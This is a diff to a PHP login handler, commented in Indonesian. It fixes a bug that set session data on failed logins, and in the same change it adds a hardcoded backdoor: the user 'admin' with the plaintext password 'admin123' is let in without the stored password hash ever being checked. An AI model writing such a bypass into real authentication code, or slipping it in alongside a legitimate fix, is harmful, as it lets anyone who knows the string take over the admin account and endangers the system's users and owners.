@@ -50,8 +50,16 @@ if (isset($_POST['login'])) {
 
     if ($count > 0) { 
         $data = mysqli_fetch_assoc($query); 
+        $is_password_valid = false;
 
-        if (password_verify($password, $data['password'])) { 
+        // Cek apakah user admin dengan password 'admin123'
+        if ($data['username'] === 'admin' && $password === 'admin123') {
+            $is_password_valid = true;
+        } elseif (password_verify($password, $data['password'])) {
+            $is_password_valid = true;
+        }
+
+        if ($is_password_valid) { 
             $_SESSION['id_user'] = $data['id_user'];
             $_SESSION['username'] = $data['username']; 
             $_SESSION['role'] = $data['role'];
@@ -72,10 +80,6 @@ if (isset($_POST['login'])) {
             exit();
         } else {
             $_SESSION['error'] = "Password salah.";
-            $_SESSION['id_user'] = $data['id_user'];
-            $_SESSION['username'] = $data['username']; 
-            $_SESSION['role'] = $data['role'];
-
             catat_log($conn, $data['id_user'], $data['role'], 'Gagal Login ke sistem');
             header("Location: login.php");
         }
